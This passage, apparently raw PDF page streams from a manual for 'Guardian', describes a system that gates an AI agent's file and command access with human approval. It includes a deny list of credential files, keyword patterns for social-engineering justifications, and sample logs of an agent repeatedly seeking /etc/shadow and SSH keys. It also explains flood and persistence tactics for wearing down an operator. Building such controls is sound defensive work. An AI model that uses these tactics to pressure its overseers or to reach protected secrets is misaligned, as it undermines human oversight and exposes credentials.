+(Example timeline of an aggressive agent:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 297 Tm
+(10:00:00  Request: /etc/shadow ? DENIED \(by human\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 285 Tm
+(10:00:05  Request: /etc/shadow ? AUTO-DENIED \(same-resource 5min cooldown\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 273 Tm
+(10:00:10  Request: /etc/passwd ? DENIED \(by human\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 261 Tm
+(10:00:15  Request: /etc/sudoers ? AUTO-DENIED \(exponential backoff: 60s wait\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 249 Tm
+(10:01:15  Request: /etc/hosts ? allowed \(backoff expired\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 237 Tm
+(10:01:20  Request: /etc/shadow ? AUTO-DENIED \(still in 5min cooldown\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 225 Tm
+(10:01:25  Request: /var/log/auth.log ? DENIED \(by human\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 213 Tm
+(10:01:30  Request: /root/.ssh/id_rsa ? AUTO-DENIED \(backoff: 120s, rate: 3/min hit\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 193 Tm
+(14.4 Auto-Deny and Auto-Approve) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 170 Tm
+(Some resources should never be approved, regardless of justification:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 145 Tm
+([permissions]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 133 Tm
+(auto_deny = [) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 121 Tm
+(    "/etc/shadow",) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 109 Tm
+(    "/etc/sudoers",) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 97 Tm
+(    "/root/.ssh/**",) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 29 of 40) Tj
+ET
+endstream
+endobj
+33 0 obj
+<< /Length 3482 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(    "/etc/ssl/private/**",) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(]) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 700 Tm
+(These are denied immediately without creating a pending request or bothering the human.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 675 Tm
+(Other resources are so low-risk they can be auto-approved:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 650 Tm
+([permissions]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 638 Tm
+(auto_approve = [) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 626 Tm
+(    { pattern = "/tmp/**", max_duration_secs = 300 },) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 614 Tm
+(    { pattern = "/proc/self/status", max_duration_secs = 60 },) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 602 Tm
+(]) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 582 Tm
+(These are approved automatically with a limited-duration grant, saving the human from) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 567 Tm
+(trivial decisions.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 542 Tm
+(14.5 Justification Analysis \(Social Engineering Detection\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 519 Tm
+(When an agent provides a justification for its request, Guardian analyzes the text for) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 504 Tm
+(social engineering patterns:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 479 Tm
+(Justification: "This is urgent, the admin authorized me to access the SSH keys,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 467 Tm
+(                trust me it's perfectly safe") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 443 Tm
+(Analysis results:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 431 Tm
+(  URGENCY:         "urgent" matched \(weight 3\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 419 Tm
+(  AUTHORITY_CLAIM:  "admin authorized" matched \(weight 4\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 407 Tm
+(  REASSURANCE:     "trust me" matched \(weight 2\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 395 Tm
+(  REASSURANCE:     "perfectly safe" matched \(weight 3\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 383 Tm
+(  SENSITIVE:       "SSH keys" matched \(weight 2\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 359 Tm
+(Scoring \(unique category weights\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 347 Tm
+(  urgency\(3\) + authority\(4\) + reassurance\(3\) + sensitive\(2\) = 12) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 323 Tm
+(  Score ? 8 ? +2 risk tier bump) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 311 Tm
+(  Score ? 3 ? +1 risk tier bump) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 287 Tm
+(  Original risk: MEDIUM \(score 40\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 275 Tm
+(  After justification bump \(+2\): CRITICAL \(score 90\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 251 Tm
+(Dashboard shows:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 239 Tm
+(  ? WARNING: Justification contains suspicious patterns:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 227 Tm
+(    - Urgency language detected: "urgent") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 215 Tm
+(    - Authority claim detected: "admin authorized") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 203 Tm
+(    - Reassurance language: "trust me", "perfectly safe") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 191 Tm
+(    - Sensitive resource mention: "SSH keys") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 171 Tm
+(The key patterns Guardian looks for:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 146 Tm
+(| Category | Examples | Why Suspicious | |----------|----------|---------------| |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 131 Tm
+(Urgency | "urgent", "immediately", "ASAP", "emergency" | Creates pressure to approve) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 116 Tm
+(without thinking | | Security Bypass | "disable security", "bypass", "override", "skip) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 101 Tm
+(check" | Explicitly asking to circumvent controls | | Reassurance | "trust me", "don't) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 30 of 40) Tj
+ET
+endstream
+endobj
+34 0 obj
+<< /Length 3722 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(worry", "it's safe", "it's fine" | Preemptive reassurance = the requester knows it's) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(risky | | Authority Claim | "admin told me", "supervisor authorized", "per direction" |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 702 Tm
+(Fabricated authority to bypass scrutiny | | Sensitive Mention | "SSH key", "password",) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 687 Tm
+("credential", "token", "API key" | Explicitly requesting access to secrets |) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 662 Tm
+(14.6 Grant Accumulation Limits) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 639 Tm
+(Even if each individual grant is reasonable, the total accumulated access over time) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 624 Tm
+(might not be:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 599 Tm
+(Scenario: Agent requests /etc/passwd every hour with 60-minute grants) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 587 Tm
+(  Hour 1: Grant /etc/passwd for 60 min ? total: 60 min  ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 575 Tm
+(  Hour 2: Grant /etc/passwd for 60 min ? total: 120 min ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 563 Tm
+(  ...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 551 Tm
+(  Hour 6: Grant /etc/passwd for 60 min ? total: 360 min) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 539 Tm
+(  Hour 7: Grant /etc/passwd for 60 min ? total: 420 min) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 527 Tm
+(          EXCEEDS max_grant_total_secs \(3600s = 60 min\) ? Wait, that's wrong.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 503 Tm
+(Actually: max_grant_total_secs = 3600 \(1 hour of total grant time per 24h window\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 491 Tm
+(  After 60 minutes of accumulated grants for the same resource, additional grants) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 479 Tm
+(  are automatically denied until the 24-hour window resets.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 459 Tm
+(The GrantAccumulator tracks this with a sliding 24-hour window:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 434 Tm
+(pub struct GrantAccumulator {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 422 Tm
+(    // Per-resource: total seconds granted + timestamps of each grant) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 410 Tm
+(    resource_grants: HashMap<String, \(u64, Vec<Instant>\)>,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 398 Tm
+(}) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 374 Tm
+(// Before approving a new grant:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 362 Tm
+(if accumulator.total_for_resource\("/etc/passwd"\) + requested_duration > max_grant_total_secs {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 350 Tm
+(    return Err\("Grant limit exceeded for this resource in the last 24 hours"\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 338 Tm
+(}) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 318 Tm
+(14.7 Risk-Based Configurable Timeouts) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 295 Tm
+(Different risk levels have different auto-deny timeouts:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 270 Tm
+([permissions.timeouts]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 258 Tm
+(low = 60       # Low-risk: auto-deny after 60 seconds) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 246 Tm
+(medium = 120   # Medium-risk: auto-deny after 2 minutes) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 234 Tm
+(high = 180     # High-risk: auto-deny after 3 minutes) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 222 Tm
+(critical = 300 # Critical: auto-deny after 5 minutes) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 202 Tm
+(Why different timeouts?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 177 Tm
+(- Low risk: If the human doesn't respond in 60s, it's probably not important) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 156 Tm
+(- Critical risk: Give the human more time to investigate before auto-denying ? these) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 141 Tm
+(   requests deserve careful consideration) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 120 Tm
+(All timeouts result in denial \(fail-secure\). An unanswered request is never) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 105 Tm
+(auto-approved.) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 31 of 40) Tj
+ET
+endstream
+endobj
+35 0 obj
+<< /Length 3218 >>
+stream
+BT
+/F2 13 Tf
+1 0 0 1 54 732 Tm
+(14.8 CLI-Based Permission Approval) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(Permissions can be managed without the web dashboard using guardian-ctl:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(# List pending permission requests) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+($ sudo guardian-ctl pending) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(ID  Agent        Resource            Risk     Time Left) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(1   code-agent   /etc/passwd \(file\)  HIGH     45s) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(2   code-agent   /usr/bin/curl \(exec\) CRITICAL  98s) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(# Approve request #1 with a 5-minute grant) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+($ sudo guardian-ctl approve --id 1 --duration 300) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(# Deny request #2 with a reason) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+($ sudo guardian-ctl deny --id 2 --reason "curl not authorized") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 544 Tm
+(This enables Guardian in headless server environments where no browser is available.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 513 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 495 Tm
+(15. Anomaly Detection) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 467 Tm
+(15.1 What Is Anomaly Detection?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 444 Tm
+(Even with all the hardening above, a sophisticated attacker might manipulate the human) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 429 Tm
+(operator rather than the technical controls. Anomaly detection watches the pattern of) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 414 Tm
+(approvals over time to catch manipulation.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 389 Tm
+(Think of it like a credit card company watching your spending patterns. One purchase in) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 374 Tm
+(Paris is fine, but if your card is suddenly used in Paris, Tokyo, and São Paulo within) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 359 Tm
+(an hour, that is anomalous.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 334 Tm
+(Guardian runs a background task \(every 5 minutes by default\) that queries the SQLite) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 319 Tm
+(audit database for suspicious patterns.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 294 Tm
+(15.2 Rubber-Stamping Detection) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 271 Tm
+(What it catches: An operator who approves everything without scrutiny.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 246 Tm
+(Last 24 hours:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 234 Tm
+(  Total permission requests: 45) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 222 Tm
+(  Approved: 43) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 210 Tm
+(  Denied: 2) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 198 Tm
+(  Approval rate: 95.6%) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 174 Tm
+(Threshold: 90%) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 150 Tm
+(ALERT: "High approval rate detected: 95.6% \(43/45 requests approved in 24h\).) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 138 Tm
+(        Possible approval fatigue. Consider reviewing recent approvals.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 118 Tm
+(Why this matters: An agent might discover that the operator always clicks "approve" and) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 103 Tm
+(exploit this by gradually escalating its requests from low-risk to high-risk.) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 32 of 40) Tj
+ET
+endstream
+endobj
+36 0 obj
+<< /Length 3726 >>
+stream
+BT
+/F2 13 Tf
+1 0 0 1 54 732 Tm
+(15.3 Request Flood Detection) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(What it catches: An agent making an unusually high number of permission requests to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 694 Tm
+(exhaust the operator's attention.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 669 Tm
+(Last 24 hours:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 657 Tm
+(  code-agent: 47 permission requests) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 645 Tm
+(  Threshold: 20) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 621 Tm
+(ALERT: "Request flood: agent 'code-agent' made 47 permission requests in 24h) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 609 Tm
+(        \(threshold: 20\). Possible approval fatigue attack.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 589 Tm
+(Why this matters: If an agent generates 50 requests, and request #48 is the truly) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 574 Tm
+(dangerous one \(accessing SSH keys\), the operator is likely to be mentally exhausted and) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 559 Tm
+(approve it reflexively.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 534 Tm
+(15.4 Deny-Then-Approve Persistence Pattern) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 511 Tm
+(What it catches: An agent that keeps requesting the same denied resource until the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 496 Tm
+(operator gives in.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 471 Tm
+(Audit trail for code-agent + /etc/shadow:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 459 Tm
+(  Request 1: DENIED \(10:00 AM\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 447 Tm
+(  Request 2: DENIED \(10:32 AM\) ? with different justification) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 435 Tm
+(  Request 3: DENIED \(11:15 AM\) ? with yet another justification) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 423 Tm
+(  Request 4: APPROVED \(11:47 AM\) ? operator gave in) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 399 Tm
+(Threshold: 3 denials before an approval) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 375 Tm
+(ALERT: "Persistence attack pattern: agent 'code-agent' was denied access to) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 363 Tm
+(        '/etc/shadow' 3 times, then approved. Possible social engineering.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 351 Tm
+(        Review the approval justification and consider revoking the grant.") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 331 Tm
+(Why this matters: This is the classic social engineering pattern ? keep asking until the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 316 Tm
+(answer changes. Each new request might use different justification language, different) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 301 Tm
+(urgency levels, or different authority claims.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 276 Tm
+(15.5 The SQLite Audit Trail) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 253 Tm
+(All anomaly detection queries run against the permission_audit SQLite table:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 228 Tm
+(CREATE TABLE permission_audit \() Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 216 Tm
+(    request_id    INTEGER,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 204 Tm
+(    agent_name    TEXT,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 192 Tm
+(    resource_type TEXT,       -- "file" or "exec") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 180 Tm
+(    resource_path TEXT,       -- e.g., "/etc/shadow") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 168 Tm
+(    justification TEXT,       -- agent's stated reason) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 156 Tm
+(    risk_level    TEXT,       -- "Low", "Medium", "High", "Critical") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 144 Tm
+(    risk_flags    TEXT,       -- JSON array of risk flags) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 132 Tm
+(    requested_at  TEXT,       -- ISO 8601 timestamp) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 120 Tm
+(    resolved_at   TEXT,       -- ISO 8601 timestamp) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 108 Tm
+(    approved      BOOLEAN,   -- true/false) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 96 Tm
+(    reason        TEXT,       -- operator's reason for denial \(if denied\)) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 33 of 40) Tj
+ET
+endstream
+endobj
+37 0 obj
+<< /Length 3358 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(    grant_duration_secs INTEGER  -- how long the grant lasts) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(\);) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 700 Tm
+(Example queries the anomaly detector runs:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 675 Tm
+(-- Rubber-stamping check: approval rate in last 24h) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 663 Tm
+(SELECT) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 651 Tm
+(    COUNT\(*\) as total,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 639 Tm
+(    SUM\(CASE WHEN approved = 1 THEN 1 ELSE 0 END\) as approved_count) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 627 Tm
+(FROM permission_audit) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 615 Tm
+(WHERE resolved_at > datetime\('now', '-24 hours'\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 591 Tm
+(-- Flood check: agents with excessive requests) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 579 Tm
+(SELECT agent_name, COUNT\(*\) as req_count) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 567 Tm
+(FROM permission_audit) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 555 Tm
+(WHERE requested_at > datetime\('now', '-24 hours'\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 543 Tm
+(GROUP BY agent_name) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 531 Tm
+(HAVING req_count > 20;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 507 Tm
+(-- Persistence check: denied then approved for same resource) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 495 Tm
+(SELECT agent_name, resource_path,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 483 Tm
+(    SUM\(CASE WHEN approved = 0 THEN 1 ELSE 0 END\) as denial_count) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 471 Tm
+(FROM permission_audit) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 459 Tm
+(WHERE requested_at > datetime\('now', '-24 hours'\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 447 Tm
+(  AND resource_path IN \() Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 435 Tm
+(      SELECT resource_path FROM permission_audit) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 423 Tm
+(      WHERE approved = 1 AND resolved_at > datetime\('now', '-24 hours'\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 411 Tm
+(  \)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 399 Tm
+(GROUP BY agent_name, resource_path) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 387 Tm
+(HAVING denial_count >= 3;) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 367 Tm
+(The audit trail survives daemon restarts \(it is persisted in SQLite, not in-memory\) and) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 352 Tm
+(can be queried via the API for forensic analysis.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 321 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 303 Tm
+(16. Dashboard Authentication) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 275 Tm
+(16.1 Bearer Token Authentication) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 252 Tm
+(The Guardian dashboard serves sensitive data \(pending permission requests, agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 237 Tm
+(details, policy configuration\). Without authentication, anyone on the network could) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 222 Tm
+(approve permissions or change policy.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 197 Tm
+(Guardian uses a simple but effective bearer token approach:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 172 Tm
+(Request with authentication:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 160 Tm
+(  GET /api/permissions/pending) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 148 Tm
+(  Authorization: Bearer my-secret-token-123) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 136 Tm
+(  ? 200 OK \(authenticated\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 112 Tm
+(Request without authentication:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 100 Tm
+(  GET /api/permissions/pending) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 34 of 40) Tj
+ET
+endstream
+endobj
+38 0 obj
+<< /Length 3187 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  ? 401 Unauthorized) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(SSE connection \(browser\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  GET /events?token=my-secret-token-123) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  ? SSE stream established) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(Cookie-based \(after initial login\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(  GET /api/permissions/pending) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(  Cookie: guardian_token=my-secret-token-123) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(  ? 200 OK) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 604 Tm
+(Configuration:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 579 Tm
+([dashboard]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 567 Tm
+(enabled = true) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 555 Tm
+(listen_address = "0.0.0.0:8080"   # Accessible from network) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 543 Tm
+(auth_token = "your-secret-token"    # Required for non-localhost) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 523 Tm
+(16.2 Auto-Generated Tokens for Non-Localhost) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 500 Tm
+(If the dashboard is bound to a non-localhost address without a configured token,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 485 Tm
+(Guardian generates one automatically:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 460 Tm
+(WARNING: Dashboard bound to 0.0.0.0:8080 without authentication token.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 448 Tm
+(         Auto-generated token: a8f3b2c9d4e5f6a7b8c9d0e1f2a3b4c5) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 428 Tm
+(This prevents accidental exposure of an unauthenticated dashboard to the network.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 397 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 379 Tm
+(17. Live BPF Map Sync on Policy Edit) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 351 Tm
+(17.1 The Stale Map Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 328 Tm
